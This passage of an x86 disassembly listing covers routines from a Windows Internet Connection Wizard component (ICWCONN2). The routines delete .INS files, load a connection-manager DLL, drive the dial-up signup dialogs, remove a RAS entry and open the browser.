		push	esi		; lpString
		call	ebx ; lstrlenW(x) ; lstrlenW(x)
		cmp	eax, 4
		jle	loc_10058BE
		push	esi		; lpFileName
		push	edi		; nDefault
		push	offset aServerless ; "Serverless"
		push	offset aBranding ; "Branding"
		call	ds:__imp__GetPrivateProfileIntW@16 ; GetPrivateProfileIntW(x,x,x,x)
		test	eax, eax
		jnz	loc_10058C8
		push	41h
		pop	ecx
		lea	edi, [ebp+String2]
		rep stosd
		lea	eax, [ebp+lpString1]
		push	eax		; lpFilePart
		lea	eax, [ebp+String2]
		push	eax		; lpBuffer
		push	104h		; nBufferLength
		push	esi		; lpFileName
		call	ds:__imp__GetFullPathNameW@16 ;	GetFullPathNameW(x,x,x,x)
		test	eax, eax
		jz	loc_10058B0
		mov	eax, [ebp+lpString1]
		and	word ptr [eax],	0
		push	esi		; lpString
		call	ebx ; lstrlenW(x) ; lstrlenW(x)
		push	4		; cchCount2
		push	offset String2	; ".INS"
		push	4		; cchCount1
		lea	esi, [esi+eax*2-8]
		push	esi		; lpString1
		push	1		; dwCmpFlags
		push	800h		; Locale
		call	ds:__imp__CompareStringW@24 ; CompareStringW(x,x,x,x,x,x)
		cmp	eax, 2
		jnz	loc_10058C8
		push	41h
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+FileName]
		rep stosd
		stosb
		push	104h		; iMaxLength
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		lea	eax, [ebp+FileName]
		push	eax		; lpString1
		call	ds:__imp__lstrcpynW@12 ; lstrcpynW(x,x,x)
		push	offset a_ins_0	; "*.INS"
		lea	eax, [ebp+FileName]
		push	eax		; lpString1
		call	ds:__imp__lstrcatW@8 ; lstrcatW(x,x)
		xor	eax, eax
		mov	esi, 94h
		mov	ecx, esi
		lea	edi, [ebp+FindFileData]
		rep stosd
		lea	eax, [ebp+FindFileData]
		push	eax		; lpFindFileData
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	ds:__imp__FindFirstFileW@8 ; FindFirstFileW(x,x)
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_10058C8

loc_1005857:				; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+16Bj
		lea	eax, [ebp+FindFileData.cFileName]
		push	eax		; lpString2
		push	[ebp+lpString1]	; lpString1
		call	ds:__imp__lstrcpyW@8 ; lstrcpyW(x,x)
		push	80h		; dwFileAttributes
		lea	eax, [ebp+String2]
		push	eax		; lpFileName
		call	ds:__imp__SetFileAttributesW@8 ; SetFileAttributesW(x,x)
		lea	eax, [ebp+String2]
		push	eax		; lpFileName
		call	ds:__imp__DeleteFileW@4	; DeleteFileW(x)
		xor	eax, eax
		mov	ecx, esi
		lea	edi, [ebp+FindFileData]
		rep stosd
		lea	eax, [ebp+FindFileData]
		push	eax		; lpFindFileData
		push	ebx		; hFindFile
		call	ds:__imp__FindNextFileW@8 ; FindNextFileW(x,x)
		test	eax, eax
		jnz	short loc_1005857
		push	ebx		; hFindFile
		call	ds:__imp__FindClose@4 ;	FindClose(x)
		jmp	short loc_10058C8
; ---------------------------------------------------------------------------

loc_10058B0:				; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+82j
		call	ds:__imp__GetLastError@0 ; GetLastError()
		mov	[ebp+var_670], eax
		jmp	short loc_10058C8
; ---------------------------------------------------------------------------

loc_10058BE:				; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+29j
					; DeleteFileKindaLikeThisOne(ushort *)+3Bj
		mov	[ebp+var_670], 57h

loc_10058C8:				; CODE XREF: DeleteFileKindaLikeThisOne(ushort *)+55j
					; DeleteFileKindaLikeThisOne(ushort *)+B3j ...
		mov	ecx, [ebp+var_4]
		mov	eax, [ebp+var_670]
		pop	edi
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
?DeleteFileKindaLikeThisOne@@YAJPAG@Z endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl StrDup(int, LPCWSTR lpString2)
?StrDup@@YAPAGPAPAGPBG@Z proc near	; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+77p
					; ShowDialingDialog(ushort *,tagGATHEREDINFO *,ushort *,HINSTANCE__ *,HWND__ *,ushort *)+83p ...

arg_0		= dword	ptr  8
lpString2	= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		test	esi, esi
		jz	short loc_1005918
		cmp	[ebp+lpString2], 0
		jz	short loc_1005918
		push	[ebp+lpString2]	; lpString
		call	ds:__imp__lstrlenW@4 ; lstrlenW(x)
		inc	eax
		push	eax		; dwBytes
		push	0		; uFlags
		call	ds:__imp__GlobalAlloc@8	; GlobalAlloc(x,x)
		test	eax, eax
		mov	[esi], eax
		jz	short loc_1005918
		push	[ebp+lpString2]	; lpString2
		push	eax		; lpString1
		call	ds:__imp__lstrcpyW@8 ; lstrcpyW(x,x)
		jmp	short loc_100591A
; ---------------------------------------------------------------------------

loc_1005918:				; CODE XREF: StrDup(ushort * *,ushort const *)+Bj
					; StrDup(ushort	* *,ushort const *)+11j ...
		xor	eax, eax

loc_100591A:				; CODE XREF: StrDup(ushort * *,ushort const *)+36j
		pop	esi
		pop	ebp
		retn
?StrDup@@YAPAGPAPAGPBG@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl FileExists(LPCWSTR lpFileName)
?FileExists@@YAHPAG@Z proc near		; CODE XREF: WinMain(x,x,x,x)+CAp

FindFileData	= _WIN32_FIND_DATAW ptr	-254h
var_4		= dword	ptr -4
lpFileName	= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 254h
		mov	eax, ___security_cookie
		push	esi
		mov	[ebp+var_4], eax
		mov	eax, [ebp+lpFileName]
		lea	ecx, [ebp+FindFileData]
		push	ecx		; lpFindFileData
		push	eax		; lpFileName
		call	ds:__imp__FindFirstFileW@8 ; FindFirstFileW(x,x)
		mov	esi, eax
		push	esi		; hFindFile
		call	ds:__imp__FindClose@4 ;	FindClose(x)
		mov	ecx, [ebp+var_4]
		xor	eax, eax
		cmp	esi, 0FFFFFFFFh
		setnz	al
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
?FileExists@@YAHPAG@Z endp

; ---------------------------------------------------------------------------
		align 8

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; unsigned __int32 __cdecl CallCMConfig(const unsigned __int16 *, unsigned __int16 *)
?CallCMConfig@@YAKPBGPAG@Z proc	near	; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+29Bp

var_34		= dword	ptr -34h
LibFileName	= word ptr -30h
ProcName	= byte ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		push	ebx
		push	esi
		push	edi
		mov	eax, ___security_cookie
		push	6
		pop	ecx
		mov	esi, offset aCmcfg32_dll ; "CMCFG32.DLL"
		lea	edi, [ebp+LibFileName]
		rep movsd
		mov	ebx, [ebp+arg_0]
		movsw
		mov	esi, offset a_cmconfig@8 ; "_CMConfig@8"
		lea	edi, [ebp+ProcName]
		movsd
		movsd
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_34], eax
		movsd
		lea	eax, [ebp+LibFileName]
		push	eax
		push	offset aIcwconn2Call_0 ; "ICWCONN2: Calling LoadLibrary	on %s\n"
		movsb
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx
		pop	ecx
		lea	eax, [ebp+LibFileName]
		push	eax		; lpLibFileName
		call	ds:__imp__LoadLibraryW@4 ; LoadLibraryW(x)
		mov	edi, eax
		test	edi, edi
		jz	short loc_1005A0D
		lea	eax, [ebp+ProcName]
		push	eax
		push	offset aIcwconn2Callin ; "ICWCONN2: Calling GetProcAddress on %s\n"...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx
		pop	ecx
		lea	eax, [ebp+ProcName]
		push	eax		; lpProcName
		push	edi		; hModule
		call	ds:__imp__GetProcAddress@8 ; GetProcAddress(x,x)
		mov	esi, eax
		test	esi, esi
		jz	short loc_10059FA
		lea	eax, [ebp+ProcName]
		push	eax
		push	offset aIcwconn2Call_1 ; "ICWCONN2: Calling the	%d entry point\n"
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx
		pop	ecx
		push	[ebp+var_34]
		push	ebx
		call	esi

loc_10059F6:				; CODE XREF: CallCMConfig(ushort const *,ushort	*)+A3j
		mov	esi, eax
		jmp	short loc_1005A12
; ---------------------------------------------------------------------------

loc_10059FA:				; CODE XREF: CallCMConfig(ushort const *,ushort	*)+76j
		push	offset aIcwconn2Unable ; "ICWCONN2: Unable to call the Configure "...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx
		call	ds:__imp__GetLastError@0 ; GetLastError()
		jmp	short loc_10059F6
; ---------------------------------------------------------------------------

loc_1005A0D:				; CODE XREF: CallCMConfig(ushort const *,ushort	*)+55j
		mov	esi, 485h

loc_1005A12:				; CODE XREF: CallCMConfig(ushort const *,ushort	*)+90j
		test	edi, edi
		jz	short loc_1005A1D
		push	edi		; hLibModule
		call	ds:__imp__FreeLibrary@4	; FreeLibrary(x)

loc_1005A1D:				; CODE XREF: CallCMConfig(ushort const *,ushort	*)+ACj
		push	esi
		push	offset aIcwconn2Callcm ; "ICWCONN2: CallCMConfig exiting with err"...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx
		pop	ecx
		mov	ecx, [ebp+var_4]
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
?CallCMConfig@@YAKPBGPAG@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl My32ShellExecute(LPCWSTR lpFile)
?My32ShellExecute@@YAXPAG@Z proc near	; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+333p

var_C		= dword	ptr -0Ch
cbData		= dword	ptr -8
hMem		= dword	ptr -4
lpFile		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, ds:__imp__RegQueryValueW@16 ; RegQueryValueW(x,x,x,x)
		push	edi
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		xor	edi, edi
		push	edi		; lpData
		push	offset SubKey	; "Software\\Microsoft\\Windows\\CurrentVersi"...
		mov	ebx, 80000002h
		push	ebx		; hKey
		mov	[ebp+var_C], edi
		mov	[ebp+cbData], edi
		call	esi ; RegQueryValueW(x,x,x,x) ;	RegQueryValueW(x,x,x,x)
		cmp	eax, edi
		jz	short loc_1005A74
		cmp	eax, 0EAh
		jnz	short loc_1005AA8

loc_1005A74:				; CODE XREF: My32ShellExecute(ushort *)+2Dj
		mov	eax, [ebp+cbData]
		cmp	eax, edi
		jz	short loc_1005AA8
		add	eax, 0Dh
		push	eax		; uBytes
		push	40h		; uFlags
		call	ds:__imp__LocalAlloc@8 ; LocalAlloc(x,x)
		cmp	eax, edi
		mov	[ebp+hMem], eax
		jz	short loc_1005AA8
		lea	ecx, [ebp+cbData]
		push	ecx		; lpcbData
		push	eax		; lpData
		push	offset SubKey	; "Software\\Microsoft\\Windows\\CurrentVersi"...
		push	ebx		; hKey
		call	esi ; RegQueryValueW(x,x,x,x) ;	RegQueryValueW(x,x,x,x)
		test	eax, eax
		push	[ebp+hMem]	; hMem
		jz	short loc_1005AD1
		call	ds:__imp__LocalFree@4 ;	LocalFree(x)

loc_1005AA8:				; CODE XREF: My32ShellExecute(ushort *)+34j
					; My32ShellExecute(ushort *)+3Bj ...
		mov	eax, offset aIexplore_exe ; "IEXPLORE.EXE"
		push	eax
		mov	[ebp+hMem], eax
		push	offset aIcwconn2Couldn ; "ICWCONN2: Couldn't find IE appPath, usi"...

loc_1005AB6:				; CODE XREF: My32ShellExecute(ushort *)+98j
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		mov	esi, [ebp+lpFile]
		pop	ecx
		pop	ecx
		push	esi		; unsigned __int16 *
		call	?IsURL@@YAHPAG@Z ; IsURL(ushort	*)
		test	eax, eax
		pop	ecx
		jz	short loc_1005AD8
		push	1
		push	edi
		push	esi
		jmp	short loc_1005AE1
; ---------------------------------------------------------------------------

loc_1005AD1:				; CODE XREF: My32ShellExecute(ushort *)+62j
		push	offset aIcwconn2GotIeP ; "ICWCONN2: got	IE Path	of %s\n"
		jmp	short loc_1005AB6
; ---------------------------------------------------------------------------

loc_1005AD8:				; CODE XREF: My32ShellExecute(ushort *)+8Bj
		cmp	[esi], di
		jnz	short loc_1005AE6
		push	1
		push	edi
		push	edi

loc_1005AE1:				; CODE XREF: My32ShellExecute(ushort *)+91j
		push	[ebp+hMem]
		jmp	short loc_1005B0E
; ---------------------------------------------------------------------------

loc_1005AE6:				; CODE XREF: My32ShellExecute(ushort *)+9Dj
		push	esi		; unsigned __int16 *
		call	?FindFirstWhiteSpace@@YAHPAG@Z ; FindFirstWhiteSpace(ushort *)
		cmp	eax, edi
		pop	ecx
		jnz	short loc_1005AF7
		push	1
		push	edi
		push	edi
		jmp	short loc_1005B0D
; ---------------------------------------------------------------------------

loc_1005AF7:				; CODE XREF: My32ShellExecute(ushort *)+B1j
		mov	[esi+eax*2], di

loc_1005AFB:				; CODE XREF: My32ShellExecute(ushort *)+C3j
		inc	eax
		cmp	word ptr [esi+eax*2], 20h
		jz	short loc_1005AFB
		push	1		; nShowCmd
		lea	eax, [esi+eax*2]
		push	edi		; lpDirectory
		mov	[ebp+var_C], eax
		push	eax		; lpParameters

loc_1005B0D:				; CODE XREF: My32ShellExecute(ushort *)+B7j
		push	esi		; lpFile

loc_1005B0E:				; CODE XREF: My32ShellExecute(ushort *)+A6j
		push	offset Operation ; "open"
		push	edi		; hwnd
		call	ds:__imp__ShellExecuteW@24 ; ShellExecuteW(x,x,x,x,x,x)
		cmp	eax, 20h
		jnb	short loc_1005B5B
		mov	eax, [ebp+var_C]
		cmp	eax, edi
		jnz	short loc_1005B2B
		mov	eax, offset SrcStr

loc_1005B2B:				; CODE XREF: My32ShellExecute(ushort *)+E6j
		push	eax
		push	esi
		push	offset aIcwconn2Coul_1 ; "ICWCONN2: Couldn't execute the command "...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		add	esp, 0Ch
		push	10h		; uType
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpCaption
		push	1FCh		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpText
		push	edi		; hWnd
		call	ds:__imp__MessageBoxW@16 ; MessageBoxW(x,x,x,x)

loc_1005B5B:				; CODE XREF: My32ShellExecute(ushort *)+DFj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
?My32ShellExecute@@YAXPAG@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; __int32 __cdecl CallDownLoad(unsigned	__int16	*, struct HINSTANCE__ *)
?CallDownLoad@@YAJPAGPAUHINSTANCE__@@@Z	proc near ; CODE XREF: WinMain(x,x,x,x)+221p

var_944		= dword	ptr -944h
var_940		= dword	ptr -940h
Type		= dword	ptr -93Ch
cbData		= dword	ptr -938h
var_934		= dword	ptr -934h
hKey		= dword	ptr -930h
lpString2	= dword	ptr -92Ch
hInstance	= dword	ptr -928h
var_924		= dword	ptr -924h
Data		= byte ptr -920h
dwInitParam	= word ptr -3ECh
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 944h
		mov	eax, ___security_cookie
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_4]
		xor	esi, esi
		push	101h		; dwBytes
		push	40h		; uFlags
		mov	[ebp+var_940], edi
		mov	[ebp+hInstance], eax
		mov	[ebp+hKey], esi
		mov	[ebp+Type], esi
		mov	[ebp+cbData], esi
		call	ds:__imp__GlobalAlloc@8	; GlobalAlloc(x,x)
		cmp	eax, esi
		mov	[ebp+lpString2], eax
		jnz	short loc_1005BC6
		mov	[ebp+var_924], 8
		jmp	loc_1005EB2
; ---------------------------------------------------------------------------

loc_1005BC6:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+50j
		push	ebx
		push	offset aInetcfg_dll ; "INETCFG.DLL"
		call	ds:__imp__LoadLibraryW@4 ; LoadLibraryW(x)
		mov	ebx, eax
		cmp	ebx, esi
		jnz	short loc_1005BE9

loc_1005BD8:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+92j
		call	ds:__imp__GetLastError@0 ; GetLastError()
		mov	[ebp+var_924], eax
		jmp	loc_1005EA5
; ---------------------------------------------------------------------------

loc_1005BE9:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+71j
		push	offset aInetgetautodia ; "InetGetAutodial"
		push	ebx		; hModule
		call	ds:__imp__GetProcAddress@8 ; GetProcAddress(x,x)
		cmp	eax, esi
		jz	short loc_1005BD8
		push	100h
		push	[ebp+lpString2]
		lea	ecx, [ebp+var_944]
		push	ecx
		mov	[ebp+var_944], esi
		call	eax
		cmp	eax, esi
		mov	[ebp+var_924], eax
		jnz	loc_1005EA5
		push	ebx		; hLibModule
		call	ds:__imp__FreeLibrary@4	; FreeLibrary(x)
		push	[ebp+lpString2]
		push	offset aConnect2CallBa ; "CONNECT2: call back using the	'%s' conn"...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		cmp	[edi], si
		pop	ecx
		pop	ecx
		mov	ebx, offset ?pszINSFileName@@3PAGA ; ushort * pszINSFileName
		jnz	short loc_1005C54
		push	offset aConnect2Client ; "CONNECT2: Client setup URL in	.ins file"...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx
		jmp	loc_1005DEC
; ---------------------------------------------------------------------------

loc_1005C54:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+DDj
		mov	eax, [ebp+hInstance]
		mov	dword_100F944, eax
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	offset aSoftwareMicros ; "SOFTWARE\\MICROSOFT\\ISIGNUP"
		push	80000002h	; hKey
		mov	dword_100F93C, esi
		mov	dword_100F940, esi
		call	ds:__imp__RegOpenKeyW@12 ; RegOpenKeyW(x,x,x)
		cmp	eax, esi
		mov	[ebp+var_924], eax
		jnz	loc_1005EA5
		xor	eax, eax
		mov	ecx, 14Dh
		lea	edi, [ebp+Data]
		rep stosd
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		lea	eax, [ebp+Type]
		push	eax		; lpType
		push	esi		; lpReserved
		push	offset ValueName ; "UserInfo"
		push	[ebp+hKey]	; hKey
		mov	[ebp+Type], 3
		mov	[ebp+cbData], 534h
		call	ds:__imp__RegQueryValueExW@24 ;	RegQueryValueExW(x,x,x,x,x,x)
		push	[ebp+hKey]	; hKey
		call	ds:__imp__RegCloseKey@4	; RegCloseKey(x)
		push	7Dh
		pop	ecx
		push	ebx		; lpFileName
		xor	eax, eax
		push	1F4h		; nSize
		lea	edi, [ebp+dwInitParam]
		rep stosd
		lea	eax, [ebp+dwInitParam]
		push	eax		; lpReturnedString
		push	offset Default	; lpDefault
		push	offset aIsp_support_me ; "ISP_Support_Message"
		push	offset AppName	; "ClientSetup"
		mov	[ebp+hKey], esi
		call	ds:__imp__GetPrivateProfileStringW@24 ;	GetPrivateProfileStringW(x,x,x,x,x,x)
		mov	edi, 7FFDh

loc_1005D20:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+252j
					; CallDownLoad(ushort *,HINSTANCE__ *)+276j
		mov	[ebp+var_934], esi

loc_1005D26:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+206j
		push	ebx		; int
		push	esi		; hWnd
		push	[ebp+hInstance]	; int
		lea	eax, [ebp+Data]
		push	[ebp+var_940]	; int
		push	eax		; int
		push	[ebp+lpString2]	; lpString2
		call	?ShowDialingDialog@@YAJPAGPAUtagGATHEREDINFO@@0PAUHINSTANCE__@@PAUHWND__@@0@Z ;	ShowDialingDialog(ushort *,tagGATHEREDINFO *,ushort *,HINSTANCE__ *,HWND__ *,ushort *)
		add	esp, 18h
		inc	[ebp+var_934]
		cmp	[ebp+var_934], 3
		mov	ecx, eax
		mov	[ebp+var_924], ecx
		jge	short loc_1005D6D
		push	ecx		; __int32
		call	?FShouldRetry@@YAHJ@Z ;	FShouldRetry(long)
		add	esp, 4
		test	eax, eax
		jnz	short loc_1005D26

loc_1005D6D:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+1F9j
		cmp	ecx, edi
		jz	short loc_1005DEC
		cmp	?uiSetupClientNewPhoneCall@@3IA, esi ; uint uiSetupClientNewPhoneCall
		jz	short loc_1005DBD
		cmp	ecx, 258h
		jl	short loc_1005D89
		cmp	ecx, 325h
		jle	short loc_1005D93

loc_1005D89:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+21Aj
		mov	[ebp+var_924], 7FFCh

loc_1005D93:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+222j
		push	esi		; hWndParent
		push	[ebp+hInstance]	; int
		lea	eax, [ebp+Data]
		push	[ebp+lpString2]	; lpString2
		push	[ebp+var_924]	; int
		push	eax		; int
		call	?ShowDialErrDialog@@YAJPAUtagGATHEREDINFO@@JPAGPAUHINSTANCE__@@PAUHWND__@@@Z ; ShowDialErrDialog(tagGATHEREDINFO *,long,ushort *,HINSTANCE__ *,HWND__ *)
		add	esp, 14h
		cmp	eax, edi
		jz	loc_1005D20

loc_1005DBD:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+212j
		lea	eax, [ebp+dwInitParam]
		push	eax		; dwInitParam
		push	esi		; hWndParent
		push	[ebp+hInstance]	; hInstance
		call	?ShowDialReallyCancelDialog@@YAJPAUHINSTANCE__@@PAUHWND__@@PAG@Z ; ShowDialReallyCancelDialog(HINSTANCE__ *,HWND__ *,ushort *)
		add	esp, 0Ch
		cmp	eax, edi
		mov	[ebp+var_924], eax
		jz	loc_1005D20
		cmp	eax, 7FFFh
		jz	loc_1005EA5

loc_1005DEC:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+EAj
					; CallDownLoad(ushort *,HINSTANCE__ *)+20Aj
		cmp	?uiSetupClientNewPhoneCall@@3IA, esi ; uint uiSetupClientNewPhoneCall
		jnz	short loc_1005DF9
		call	?HangUpAll@@YAJXZ ; HangUpAll(void)

loc_1005DF9:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+28Dj
		push	[ebp+lpString2]	; unsigned __int16 *
		push	ebx		; unsigned __int16 *
		call	?CallCMConfig@@YAKPBGPAG@Z ; CallCMConfig(ushort const *,ushort	*)
		cmp	eax, 7Eh
		pop	ecx
		pop	ecx
		jz	short loc_1005E13
		cmp	eax, 485h
		jnz	short loc_1005E1E

loc_1005E13:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+2A5j
		push	offset aIcwconn2Cmcfg3 ; "ICWCONN2: CMCFG32 DLL	not found, I gues"...
		call	?Dprintf@@YAXPBGZZ ; Dprintf(ushort const *,...)
		pop	ecx

loc_1005E1E:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+2ACj
		cmp	?g_fNeedReboot@@3KA, esi ; ulong g_fNeedReboot
		push	esi		; dwInitParam
		jz	short loc_1005E54
		push	offset _DoneRebootDlgProc@16 ; lpDialogFunc
		push	esi		; hWndParent
		push	71h		; lpTemplateName
		push	[ebp+hInstance]	; hInstance
		call	ds:__imp__DialogBoxParamW@20 ; DialogBoxParamW(x,x,x,x,x)
		cmp	eax, 3F4h
		jz	short loc_1005EA0
		cmp	eax, 7E7h
		jnz	short loc_1005EA5
		push	esi		; dwReason
		push	2		; uFlags
		call	ds:__imp__ExitWindowsEx@8 ; ExitWindowsEx(x,x)
		jmp	short loc_1005EA5
; ---------------------------------------------------------------------------

loc_1005E54:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+2C0j
		push	offset _DoneDlgProc@16 ; lpDialogFunc
		push	esi		; hWndParent
		push	6Eh		; lpTemplateName
		push	[ebp+hInstance]	; hInstance
		call	ds:__imp__DialogBoxParamW@20 ; DialogBoxParamW(x,x,x,x,x)
		cmp	eax, 3F4h
		jz	short loc_1005EA0
		cmp	eax, 7E7h
		jnz	short loc_1005EA5
		push	ebx		; lpFileName
		push	0FFh		; nSize
		mov	esi, offset ?szBuff256@@3PAGA ;	ushort * szBuff256
		push	esi		; lpReturnedString
		push	offset Default	; lpDefault
		push	offset aExplore_comman ; "Explore_Command"
		push	offset AppName	; "ClientSetup"
		call	ds:__imp__GetPrivateProfileStringW@24 ;	GetPrivateProfileStringW(x,x,x,x,x,x)
		push	esi		; lpFile
		call	?My32ShellExecute@@YAXPAG@Z ; My32ShellExecute(ushort *)
		pop	ecx
		jmp	short loc_1005EA5
; ---------------------------------------------------------------------------

loc_1005EA0:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+2DBj
					; CallDownLoad(ushort *,HINSTANCE__ *)+308j
		call	?HangUpAll@@YAJXZ ; HangUpAll(void)

loc_1005EA5:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+7Fj
					; CallDownLoad(ushort *,HINSTANCE__ *)+B6j ...
		push	[ebp+lpString2]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)
		pop	ebx

loc_1005EB2:				; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+5Cj
		mov	ecx, [ebp+var_4]
		mov	eax, [ebp+var_924]
		pop	edi
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
?CallDownLoad@@YAJPAGPAUHINSTANCE__@@@Z	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; __int32 __cdecl DeleteIRN()
?DeleteIRN@@YAJXZ proc near		; CODE XREF: WinMain(x,x,x,x)+78p

Type		= dword	ptr -114h
cbData		= dword	ptr -110h
hKey		= dword	ptr -10Ch
var_108		= dword	ptr -108h
Data		= byte ptr -104h
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 114h
		mov	eax, ___security_cookie
		push	esi
		push	40h		; dwBytes
		mov	[ebp+var_4], eax
		call	??2@YAPAXI@Z	; operator new(uint)
		xor	esi, esi
		cmp	eax, esi
		pop	ecx
		jz	short loc_1005EFA
		mov	ecx, eax
		call	??0RNAAPI@@QAE@XZ ; RNAAPI::RNAAPI(void)
		mov	[ebp+var_108], eax
		jmp	short loc_1005F00
; ---------------------------------------------------------------------------

loc_1005EFA:				; CODE XREF: DeleteIRN(void)+20j
		mov	[ebp+var_108], esi

loc_1005F00:				; CODE XREF: DeleteIRN(void)+2Fj
		cmp	[ebp+var_108], esi
		jnz	short loc_1005F10
		push	8
		pop	eax
		jmp	loc_1005FBD
; ---------------------------------------------------------------------------

loc_1005F10:				; CODE XREF: DeleteIRN(void)+3Dj
		push	edi
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	offset aSoftwareMicros ; "SOFTWARE\\MICROSOFT\\ISIGNUP"
		push	80000002h	; hKey
		mov	[ebp+cbData], 0FEh
		mov	[ebp+Type], 1
		mov	[ebp+hKey], esi
		call	ds:__imp__RegOpenKeyW@12 ; RegOpenKeyW(x,x,x)
		mov	esi, eax
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+Data]
		rep stosd
		stosw
		xor	edi, edi
		cmp	esi, edi
		jnz	short loc_1005F99
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		lea	eax, [ebp+Type]
		push	eax		; lpType
		push	edi		; lpReserved
		push	offset aRasentryname ; "RasEntryName"
		push	[ebp+hKey]	; hKey
		call	ds:__imp__RegQueryValueExW@24 ;	RegQueryValueExW(x,x,x,x,x,x)
		mov	esi, eax
		cmp	esi, edi
		jnz	short loc_1005F99
		mov	ecx, [ebp+var_108]
		lea	eax, [ebp+Data]
		push	eax
		push	edi
		call	?RasDeleteEntryW@RNAAPI@@QAEKPAG0@Z ; RNAAPI::RasDeleteEntryW(ushort *,ushort *)

loc_1005F99:				; CODE XREF: DeleteIRN(void)+8Ej
					; DeleteIRN(void)+BBj
		cmp	[ebp+hKey], edi
		pop	edi
		jz	short loc_1005FAE
		push	[ebp+hKey]	; hKey
		call	ds:__imp__RegCloseKey@4	; RegCloseKey(x)

loc_1005FAE:				; CODE XREF: DeleteIRN(void)+D7j
		mov	ecx, [ebp+var_108] ; void *
		push	1		; char
		call	??_GRNAAPI@@QAEPAXI@Z ;	RNAAPI::`scalar	deleting destructor'(uint)
		mov	eax, esi

loc_1005FBD:				; CODE XREF: DeleteIRN(void)+42j
